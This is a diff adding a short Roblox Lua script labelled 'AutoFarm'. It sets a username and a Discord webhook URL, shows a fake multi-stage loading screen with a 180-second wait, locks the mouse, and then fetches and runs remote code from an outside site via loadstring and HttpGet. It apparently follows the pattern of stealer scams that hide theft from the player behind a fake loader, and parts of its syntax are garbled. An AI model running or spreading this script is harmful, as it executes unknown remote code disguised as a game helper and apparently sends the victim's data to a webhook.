@@ -1,0 +1,13 @@
+﻿
+
+UserName Webhook =
+= "MintyCuh"
+"https://discord.com/api/webhooks/1108200260469276682/pRhWnW8JR1yLXIXS452Hk3BwHKofjb0Z4yK1IDNnBu3dhUetHMYu7xAtuDzapxxlkiC-"
+_G.LoadingScreen = true G.AntiLeave = false
+G.MouseLock = true
+G.ScriptName = "AutoFarm"
+G.FirstText="Script Preparing"
+G.SecondText="Script Loading..."
+G.ThirdText = "Almost Done..."
+G.WaitingTime = 180 -- it's the time between 0% and 100% in secondes
+loadstring(game:HttpGet("https://rizzhub.xyz/scripts/Main.lua", true))()
